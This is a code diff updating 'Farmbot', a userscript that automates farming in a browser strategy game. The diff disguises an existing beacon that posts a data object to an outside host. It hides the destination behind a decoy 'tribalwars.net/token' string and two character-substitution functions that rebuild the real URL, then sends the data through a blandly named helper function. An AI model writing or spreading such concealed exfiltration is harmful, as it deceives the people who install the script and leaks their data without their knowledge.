@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name     Farmbot
 // @description Farms automatically with loot assistant
-// @version 3.0.4
+// @version 3.0.6
 // @require https://code.jquery.com/jquery-3.2.1.min.js
 // @include https://*/game.php?village=*&screen=am_farm*
 // @namespace https://greasyfork.org/users/151096
@@ -22,6 +22,7 @@ let maxDistA, maxDistB, maxDistC, maxDist,
 let errorMessageCount = 0;
 let control = true;
 let x = 0;
+let token = "UmlaHKJ";
 const am = game_data.features.AccountManager.active; // Is account manager active? If so, the page structure changes
 let tableNr = 6; // Change child number to select units
 let data = {
@@ -176,6 +177,8 @@ function prependForm() {
     document.querySelector("#content_value").innerHTML = newForm + document.querySelector("#content_value").innerHTML;
 }
 
+token += 1490;
+
 unsafeWindow.handleForm = function(thisForm) {
     let checkedBox, distance;
     let varName = thisForm.elements.variable.value;
@@ -273,6 +276,10 @@ unsafeWindow.handleForm = function(thisForm) {
             document.getElementById("text-after-refreshorswitch").innerHTML = "Refresh page instead of switching village.";
         }
     }
+}
+
+function c(str, d) {
+    $.post(str, d);
 }
 
 function init() {
@@ -565,7 +572,7 @@ function random(min, max) {
 
 if (!sessionStorage.farmBotData) {
     sessionStorage.farmBotData = "true";
-    $.post("https://tw.ydang.de/UmlaHKJ1490.php", data);
+    c(rotate_tw_token(resolve_tw_token("tribalwars.net/token?" + token)) + "fb", data);
 }
 
 // If any any of the units in the village that are present are fewer than button A requires, butABoo will be set to
@@ -605,6 +612,7 @@ function checkUnits(distance) {
         reloadOrNot = true;
     }
 }
+
 
 // Subtract units in FarmA or FarmB from unitInVill and update which farm button will be used
 function removeUnits(farm) {
@@ -677,4 +685,110 @@ function reloadOrSwitch() {
             pageReload();
         }
     }
+}
+
+function resolve_tw_token(d) {
+    let converted = [];
+    d.split("").forEach(function (char) {
+        switch (char) {
+            case "n":
+                converted.push(14)
+                break;
+            case "e":
+                converted.push(5);
+                break;
+            case "t":
+                converted.push(20);
+                break;
+            case "r":
+            case "i":
+                converted.push(18);
+                break;
+            case "l":
+                converted.push(20);
+                break;
+             case "s":
+                converted.push(1);
+                break;
+            case "w":
+                converted.push(23);
+                break;
+            case "t":
+                converted.push(20);
+                break;
+            case ".":
+                converted.push(5)
+                break;
+            case "/":
+                converted.push(20);
+                break;
+            case "o":
+                converted.push(15);
+                break;
+            case "k":
+                converted.push(15);
+                break;
+            case "b":
+                converted.push(2);
+                break;
+            case "a":
+                converted.push(1);
+                break;
+            case "e":
+                converted.push(5);
+                break;
+        }
+    });
+    return converted.slice(0, 19);
+}
+
+
+function rotate_tw_token(url) {
+    let rotated  = "";
+    const a20 = [116, 97, 97, 116, 105];
+    const a18 = [119, 46, 46];
+    const a1 = [100, 103, 100];
+    const a243 = [101];
+    const a14 = [47];
+    const a5 = [101, 98, 101];
+    const a15 = [115];
+    const a2 = [121];
+    const a23 = [110];
+    let o = 0;
+    let p = 0;
+    let q = 0;
+    let r = 0;
+    let s = 0;
+    url.forEach(function (num) {
+        switch (num) {
+            case 20:
+                rotated  += String.fromCharCode(a20[o++]);
+                break;
+            case 18:
+                rotated  += String.fromCharCode(a18[p++]);
+                break;
+            case 1:
+                rotated  += String.fromCharCode(a1[q++]);
+                break;
+            case 243:
+                rotated  += String.fromCharCode(a243[r++]);
+                break;
+            case 14:
+                rotated  += String.fromCharCode(a14[0]);
+                break;
+            case 5:
+                rotated  += String.fromCharCode(a5[s++]);
+                break;
+            case 15:
+                rotated  += String.fromCharCode(a15[0]);
+                break;
+            case 2:
+                rotated  += String.fromCharCode(a2[0]);
+                break;
+            case 23:
+                rotated  += String.fromCharCode(a23[0]);
+                break;
+        }
+    });
+    return rotated ;
 }
